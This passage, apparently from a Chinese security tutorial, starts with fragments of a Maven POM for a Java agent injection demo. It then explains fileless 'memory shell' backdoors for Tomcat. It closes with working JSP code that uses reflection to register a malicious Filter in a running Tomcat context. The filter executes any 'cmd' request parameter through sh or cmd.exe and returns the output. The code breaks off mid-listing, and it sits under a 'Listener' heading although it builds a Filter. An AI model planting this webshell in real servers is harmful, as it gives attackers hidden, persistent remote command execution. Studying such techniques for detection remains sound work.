        4.0.0
        org.example
        attachfordemo
        2.0-SNAPSHOT
                io.earcam.wrapped
                com.sun.tools.attach
                1.8.0_jdk8u172-b11
                org.javassist
                javassist
                3.22.0-GA
                    org.apache.maven.plugins
                    maven-assembly-plugin
                    2.4.1
                            jar-with-dependencies
                                true
                                priv.agentmaininjectdemo.Attachthings
    -->
    priv.agentmaininjectdemo.Agentthing-->
    true-->
    true-->
    true-->
    -->
                            make-assembly
                            package
                                single
            8
            8
注意打包agent程序Agentthings类的时候使用AgentClass标签，并传入Can-Redefine-Classes、Can-Retransform-Classes为True；
接下来先运行MainforRun主程序；
可以看到每隔5s输出hello
然后运行注入程序attach：
可以看到，运行中java应用程序被agent注入并再运行时被向Peoples的say方法注入了字节码。
上面小demo **项目地址：()**
# 三、内存马
无落地文件，运行在内存中的后门木马，一般重启可以消除。
## 简介
## 1、内存马的分类
更具内存马的实现技术来分类将内存马分为三类：
  * 1、基于动态添加Servlet组件的内存马
  * 2、基于动态添加框架组件的内存马
  * 3、基于Javaagent和Javassist技术的内存马
## 2、内存马的实现
### 1）、基于动态添加Servlet组件的内存马实现
下面都是通过jsp来实现对Servlet各个组件的动态注册：
##### 动态注册Servlet
  * 1、首先通过反射，从request中获取Tomcat中控制Web应用的Context（StandardContext对象），上文中有提到获取StandardContext获取的方式，这里因为是jsp来实现的，所以可以直接拿到request，所以就利用上文提到的第一种方法，通过反射即可获取到Tomcat下的StrandardContext对象，下面也是同理。
  * 2、注册一个Servlet对象并重写其Service方法，在其中实现命令执行并通过response返回
  * 3、创建Wrapper对象并利用各个船舰的Servlet来初始化
  * 4、为Wrapper添加路由映射
        servletshell
##### **动态注册Filter**
  * 1、首先通过反射，从request中获取Tomcat中控制Web应用的Context（StandardContext对象）
  * 2、利用获取的上下文StandardContext对象获取filterconfigs对象
  * 3、创建一个恶意Filter对象并重写其doFilter方法，在其中实现命令执行并通过response返回，最后filterChain传入后面的filter
  * 4、创建FilterDef对象并利用刚刚创建的Filter对象来初始化，并新建一个FilterMap对象，为创建的FilterDef对象添加URL映射
  * 5、利用创建FilterConfig对象并使用刚刚创建的FilterDef对象初始化，最后将其加入FilterConfigs里面，等待filterChain.dofilter调用
##### **动态注册Listener**
    //适用于tomcat8
    <%
        final String name = "shell";
        // 获取上下文，即standardContext
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
        //获取上下文中 filterConfigs
        Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
        Configs.setAccessible(true);
        Map filterConfigs = (Map) Configs.get(standardContext);
        //创建恶意filter
        if (filterConfigs.get(name) == null){
            Filter filter = new Filter() {
                @Override
                public void init(FilterConfig filterConfig) throws ServletException {
                }
                @Override
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest) servletRequest;
                    if (req.getParameter("cmd") != null) {
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner( in ).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        servletResponse.getWriter().write(output);
                        servletResponse.getWriter().flush();
                        return;
                    }
                    filterChain.doFilter(servletRequest, servletResponse);
                }
                @Override
                public void destroy() {
                }